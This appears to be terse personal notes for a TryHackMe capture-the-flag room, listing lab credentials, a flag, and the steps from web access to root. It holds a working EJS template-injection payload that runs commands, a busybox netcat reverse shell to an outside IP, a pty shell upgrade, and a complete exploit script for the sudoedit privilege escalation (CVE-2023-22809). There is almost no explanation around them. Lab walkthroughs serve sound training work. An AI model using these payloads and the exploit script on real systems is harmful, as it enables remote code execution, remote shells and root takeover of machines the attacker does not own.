usernmae = Gayle Bev
password = p~]P@5!6;rs558:q


Tyrell Wellick phone : 	842-029-570
https://github.com/mde/ejs/issues/735?source=post_page-----fbe6a2bf70af--------------------------------
```code
http://127.0.0.1:3000/?name=John&settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('calc');
```
busybox nc 10.17.2.145 4444 -e /bin/sh))

```final mod request
name=test&settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('busybox nc 10.17.2.145 4444 -e /bin/sh');
```
python3 -c "import pty;pty.spawn('/bin/bash')"

user.txt -> THM{4lways_upd4te_uR_d3p3nd3nc!3s}

```bash exploit.sh
#!/usr/bin/env bash
#
# Exploit Title: sudo 1.8.0 - 1.9.12p1 - Privilege Escalation
# 
# Exploit Author: n3m1.sys
# CVE: CVE-2023-22809
# Date: 2023/01/21
# Vendor Homepage: https://www.sudo.ws/
# Software Link: https://www.sudo.ws/dist/sudo-1.9.12p1.tar.gz
# Version: 1.8.0 to 1.9.12p1
# Tested on: Ubuntu Server 22.04 - vim 8.2.4919 - sudo 1.9.9
#
# Running this exploit on a vulnerable system allows a localiattacker to gain 
# a root shell on the machine.
#
# The exploit checks if the current user has privileges to run sudoedit or 
# sudo -e on a file as root. If so it will open the sudoers file for the
# attacker to add a line to gain privileges on all the files and get a root 
# shell.

if ! sudo --version | head -1 | grep -qE '(1\.8.*|1\.9\.[0-9]1?(p[1-3])?|1\.9\.12p1)$'
then
    echo "> Currently installed sudo version is not vulnerable"
    exit 1
fi

EXPLOITABLE=$(sudo -l | grep -E "sudoedit|sudo -e" | grep -E '\(root\)|\(ALL\)|\(ALL : ALL\)' | cut -d ')' -f 2-)

if [ -z "$EXPLOITABLE" ]; then
    echo "> It doesn't seem that this user can run sudoedit as root"
    read -p "Do you want to proceed anyway? (y/N): " confirm && [[ $confirm == [yY] ]] || exit 2
else
    echo "> BINGO! User exploitable"
fi

echo "> Opening sudoers file, please add the following line to the file in order to do the privesc:"
echo "$USER ALL=(ALL:ALL) ALL"
read -n 1 -s -r -p "Press any key to continue..."
EDITOR="vim -- /etc/sudoers" $EXPLOITABLE
sudo su root
exit 0


```
```explaination

bw```



root.txt ->




### References 
https://jaxafed.github.io/posts/tryhackme-whiterose/
https://www.exploit-db.com/exploits/51217 [web -> root] [previlage esclation]
https://github.com/n3m1sys/CVE-2023-22809-sudoedit-privesc/blob/main/exploit.sh [previlage esclation]
